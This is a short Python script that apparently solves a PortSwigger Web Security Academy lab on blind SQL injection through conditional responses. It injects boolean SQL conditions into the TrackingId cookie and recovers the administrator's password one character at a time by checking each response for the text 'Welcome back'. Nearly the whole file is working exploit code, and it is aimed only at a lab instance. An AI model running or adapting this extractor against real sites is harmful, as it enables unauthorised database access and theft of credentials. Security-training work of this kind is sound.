import requests

# Scenario :- https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses
# Editing cookie values to retrive data from database

def check_welcome_back(url):
    try:
        password = ''
        for i in range(1,21):
            for j in range(48,58):
                cookies_value = f"iHC5zNdWXJc5O5aT' and (select SUBSTRING(password,{i},1) from users where username ='administrator') ='{chr(j)}' --"
                response = requests.get(url, cookies={'TrackingId':cookies_value})
                if "Welcome back" in response.text:
                    password = password+chr(j)
                    print(chr(j))
                    break
            for j in range(97,123):
                cookies_value = f"iHC5zNdWXJc5O5aT' and (select SUBSTRING(password,{i},1) from users where username ='administrator') ='{chr(j)}' --"
                response = requests.get(url, cookies={'TrackingId':cookies_value})
                if "Welcome back" in response.text:
                    password = password+chr(j)
                    break
        return password

    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False

url = 'https://0a2700c40499e68581a4d93a00ca0093.web-security-academy.net'
password = check_welcome_back(url)
print(password)
